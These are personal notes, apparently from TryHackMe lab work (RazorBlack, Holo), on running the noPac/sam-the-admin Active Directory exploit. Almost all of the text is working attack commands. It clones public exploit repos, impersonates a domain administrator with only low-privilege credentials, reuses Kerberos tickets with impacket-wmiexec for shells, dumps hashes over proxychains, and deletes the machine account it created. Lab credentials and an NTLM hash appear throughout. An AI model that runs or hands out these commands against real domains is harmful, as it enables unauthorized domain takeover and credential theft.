# attacking machines with noPac exploit #
# logic
        spoof a workstation account to request a ticket for a domain admin with no pack
                * pack is the part of a ticket that contains user information

        (Pac = "Privileged Attribute Certificate")

        % if vuln able to impersonate a admin a DCSYNC the target

% only need a set of valid domain creds to sploit

-----------------------------------------------------------------------------------
# setup

% exploit code
        git clone https://github.com/WazeHell/sam-the-admin.git

{%%} performing the noPac attack (THM: RazorBlack)

        sudo python3 sam_the_admin.py -dc-ip <rhost-ip> <domain-name>/<username>:<password>
        sudo python3 sam_the_admin.py -dc-ip 10.10.152.25 raz0rblack.thm/twilliams:roastpotatoes

* make sure you include tne netbios/hostname of the box for the highest priv user
        proxychains python3 sam_the_admin.py -dc-ip 10.200.151.30 -dc-host DC-SRV01 holo.live/watamet:Nothingtoworry!

% get a shell with the impacket-smb command or a other like wmiexec, psexec, etc

        KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-wmiexec -k -no-pass raz0rblack.thm/twilliams:roastpotatoes@10.10.152.25

* needs to be modified because of the extra domain

        KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-wmiexec -k -no-pass raz0rblack.thm/twilliams:roastpotatoes@10.10.152.25

        KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-wmiexec -k -no-pass -dc-ip 10.10.152.25 raz0rblack.thm/twilliams:roastpotatoes@haven-dc.raz0rblack.thm
        KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-wmiexec -k -no-pass raz0rblack.thm/twilliams:roastpotatoes@haven-dc.raz0rblack.thm

{what worked for me after adding the netbios hostname and domain name to the /etc/hosts file}

        KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-wmiexec -dc-ip 10.10.21.231 -k -no-pass raz0rblack.thm/Administrator@haven-dc.raz0rblack.thm

=-=-=-=-=-=-=-=------------=-=-=-=-=-=-=-=-=-=
% if it fails

1. attempt a time sync
        sudo apt install ntpdate -y

        sudo ntpdate <rhost-ip>
        sudo ntpdate 10.10.152.25

---------------------------------------------------------------------------------------------
# clean up after the fact (just delete the user that was created to impersonate administrator
% account creaated
        SAMTHEADMIN-39$:CxP)O@kQyHqW

% how to figure out that account is still there
        1. rid-cycling

                crackmapexec smb 10.10.85.161 -u twilliams -p roastpotatoes --rid-brute

% how to remove account //{!}\\ by using impacket (addcomputer.py) to remove the machine account

        impacket-addcomputer -dc-ip 10.10.104.115 -computer-name 'SAMTHEADMIN-55$' -dc-host HAVEN-DC -domain-netbios raz0rblack.thm 'raz0rblack.thm/oreo:P@ssw0rd' -delete

{/!\} check to make sure the ticket still works after the account SAMTHEADMIN account has been removed
        KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-wmiexec -dc-ip 10.10.104.115 -k -no-pass raz0rblack.thm/Administrator@haven-dc.raz0rblack.thm

        * yes still works pog

---------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 0r just use Alh4zr3d version which auto deletes it
        git clone https://github.com/Alh4zr3d/sam-the-admin.git

        proxychains python3 sam_the_admin.py -dc-ip 10.200.151.30 holo.live/watamet:Nothingtoworry!
        proxychains python3 sam_the_admin.py -dc-ip 10.200.151.30 -dc-host DC-SRV01 holo.live/watamet:Nothingtoworry!

        export KRB5CCNAME='a-fubukis.ccache'
        proxychains impacket-wmiexec -dc-ip 10.200.151.30 -k -no-pass holo.live/a-fubukis@10.200.151.30

{!} problems with same the admin
        * some networks return this authentication error
        [-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)

                * since you can't select what user to impersonate
                        there is a change that the ticket you get is for a user who may not be able to authenticate

---------------------------\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\================================-----------------------
# or a more automated version of noPac from this repo ;'..;' https://github.com/Ridter/noPac.git
        git clone https://github.com/Ridter/noPac.git

% how use it (defaults)
{auto shell}
        python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 -shell --impersonate administrator

        proxychains python3 noPac.py -use-ldap holo.live/watamet:Nothingtoworry! -dc-ip 10.200.151.30 -dc-host DC-SRV01 -shell --impersonate administrator
        proxychains python3 noPac.py holo.live/watamet:Nothingtoworry! -dc-ip 10.200.151.30 -dc-host DC-SRV01 -shell --impersonate administrator

% example from the holo network noPac attempt
        python3 noPac.py -use-ldap -dc-ip <IP> <DOMAIN>/<USER>:<PASS> --impersonate administrator -dump

1. domain into
        [*] Windows 10.0 Build 17763 x64 (name:DC-SRV01) (domain:holo.live) (signing:False) (SMBv1:False)
        watamet:Nothingtoworry!

2. perform the attack over socks proxy
        proxychians python3 noPac.py -use-ldap -dc-ip <IP> <DOMAIN>/<USER>:<PASS> --impersonate administrator -dump
        proxychains python3 noPac.py -use-ldap -dc-ip 10.200.151.30 holo.live/watamet:Nothingtoworry! --impersonate administrator -dump

        -use-ldap ("used when the server is running it's service with ssl")

3. psexec in
        proxychains impacket-wmiexec holo.live/Administrator@10.200.151.30 -hashes ae19656e1067231cb5e3c5dcea320bba:ae19656e1067231cb5e3c5dcea320bba

0r
        use the ticket it creates with a method above
